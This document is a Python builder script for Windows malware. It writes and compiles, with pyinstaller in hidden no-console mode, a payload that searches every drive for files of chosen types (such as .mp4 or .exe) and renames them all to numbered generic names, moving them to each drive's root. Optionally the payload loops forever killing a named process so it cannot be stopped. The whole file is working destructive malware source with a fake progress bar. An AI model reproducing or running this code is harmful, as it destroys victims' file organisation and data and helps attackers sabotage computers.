import os , time , sys , subprocess

os.system("cls")
namefile = input("enter new name  for rename file: ")
os.system("cls")
filesformat = input("Enter file formats (.mp4,.mp3,.exe,...): ")
os.system("cls")
filesformat = filesformat.split(",")
lenefileformats = int(len(filesformat))-1
exename = input("Enter .exe file name : ")
os.system("cls")
taskm = input("Do you want to prevent the task from opening (y/n) ? ")
os.system("cls")

#############################

if taskm == "y" or taskm == "Y" or taskm == "yes" or taskm == "Yes":

    prname = input("Enter task name ( notepad.exe ) : ")
    atask = f"""
while True:
    a = subprocess.getoutput("tasklist")
    if "{prname}" in a:
        os.system("taskkill /f /IM {prname}")
    else:
        continue"""

  
elif taskm == "n" or taskm == "N" or taskm == "no" or taskm == "No":
    atask=""

else:
    print("Error")
    sys.exit()
    
##############################

i = 0
while i <= lenefileformats:
    a = filesformat[i]

    if a[0] != ".":
        print(f"please Enter (.) before {a} !!!")
        sys.exit()
    else:
        pass

    if int(len(a)) > 5 :
        print(f"The format {a} is wrong")
        sys.exit()
    else:
        pass
    i += 1

##########################

os.system("cls")
print("Checking pyinstaller ...")
time.sleep(2)
a = subprocess.getoutput("pip freeze")

if "pyinstaller" in a:
    os.system("cls")
    print("pyinstaller is ready")
    time.sleep(2)
else:
    os.system("cls")
    os.system("pip install pyinstaller")

#################################

username = os.environ["USERNAME"]
os.chdir(rf"C:\Users\{username}")
Des = subprocess.getoutput("dir")
if "Desktop" in Des:
    os.chdir("Desktop")
elif "OneDrive" in Des:
    os.chdir(r"OneDrive\Desktop")
else:
    path = input(r"Please Enter path (C:\Users\username\OneDrive\Desktop) : ")
    os.chdir(path)


############################################

os.system("cls")
print("Loading ...\n")
time.sleep(2)
print(" 5% --> |===               |\n")
time.sleep(3)
print(" 20% -->|========          |\n")
time.sleep(3)
print(" 50% -->|============      |\n")
time.sleep(3)
print(" 80% -->|================  |\n")
time.sleep(3)
print("100% -->|==================|\n")
time.sleep(2)

with open(f"{exename}.py","w+") as file:
    file.write(f""" 
import subprocess , os

######################

# get drive name
drives = subprocess.getoutput("wmic logicaldisk get name")
drives = drives.split()
drives.remove("Name")

###################

formats = {filesformat}
list1 = []
# H: && dir /S /B *.psd

def Fdrive(drname):
    global list1

    for i in formats:
        a = subprocess.getoutput(str(drname)+" && dir /S /B *"+str(i))
        a = a.splitlines()

        if "The device is not ready." in a :
            a.remove("The device is not ready.")
        if "File Not Found" in a :
            a.remove("File Not Found")
        else:
            pass

        list1.extend(a)
    

for i in drives:
    Fdrive(i)

########################
formatha = []
for i in list1:
    formatha.append(str(i[-4:]))

lenformat = int(len(formatha))-1
newformatlist = []
i = 0
while i <= lenformat:
    n = formatha[i]
    if n[0] != ".":
        newformatlist.append(f"."+n)
    else:
        newformatlist.append(n)
    i+= 1

###################################
       
newname = "{namefile}"

a = 1
a2 = 0
for i in list1 :
    os.chdir(i[:2])
    newname2 = newname+str(a)+newformatlist[a2]
    os.rename(i , newname2)
    a += 1
    a2 += 1

print('finish')

{atask}
    
    """)

os.system("cls")
os.system(f"pyinstaller {exename}.py --onefile --noconsole")
# os.remove(f"{exename}.py")
os.system("cls")
print(f"file {exename}.exe created")
input()